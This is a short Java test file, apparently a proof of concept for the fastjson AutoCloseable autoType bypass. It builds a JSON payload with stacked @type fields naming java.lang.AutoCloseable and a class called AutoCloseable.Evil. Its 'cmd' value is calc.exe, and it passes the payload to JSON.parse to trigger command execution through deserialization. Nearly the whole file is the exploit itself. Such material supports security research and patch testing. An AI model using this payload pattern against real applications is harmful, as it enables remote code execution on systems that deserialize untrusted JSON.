package AutoCloseable;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;

public class Test {
    public static void main(String[] args) {
        String payload21 = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"AutoCloseable.Evil\",\"cmd\":\"calc.exe\"}";
        JSON.parse(payload21);
    }
}